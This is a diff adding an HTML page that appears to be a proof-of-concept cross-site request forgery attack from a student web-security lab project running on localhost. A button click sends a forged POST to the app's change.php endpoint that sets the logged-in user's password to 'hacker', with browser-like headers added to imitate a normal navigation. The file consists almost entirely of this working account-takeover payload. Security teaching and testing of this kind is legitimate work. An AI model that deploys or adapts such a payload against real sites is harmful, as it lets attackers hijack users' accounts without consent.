@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Execute POST Request</title>
+</head>
+<body>
+    <button id="submitButton">Execute POST Request</button>
+
+    <script>
+        document.getElementById("submitButton").addEventListener("click", function () {
+            // Prepare the POST request
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", "/webSecProject/change.php", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+            // Set headers (if needed)
+            xhr.setRequestHeader("Cache-Control", "max-age=0");
+            xhr.setRequestHeader("sec-ch-ua", '"Chromium";v="131", "Not_A Brand";v="24"');
+            xhr.setRequestHeader("sec-ch-ua-mobile", "?0");
+            xhr.setRequestHeader("sec-ch-ua-platform", '"Windows"');
+            xhr.setRequestHeader("Upgrade-Insecure-Requests", "1");
+            xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
+            xhr.setRequestHeader("Sec-Fetch-Site", "same-origin");
+            xhr.setRequestHeader("Sec-Fetch-Mode", "navigate");
+            xhr.setRequestHeader("Sec-Fetch-User", "?1");
+            xhr.setRequestHeader("Sec-Fetch-Dest", "document");
+            xhr.setRequestHeader("Referer", "http://localhost/webSecProject/welcome.php");
+
+            // Data to send
+            const data = "password=hacker&confirm_password=hacker&change=change";
+
+            // Send the request
+            xhr.send(data);
+
+            xhr.onload = function () {
+                if (xhr.status === 200) {
+                    alert("Request executed successfully!");
+                } else {
+                    alert("Request failed. Status: " + xhr.status);
+                }
+            };
+        });
+    </script>
+</body>
+</html>
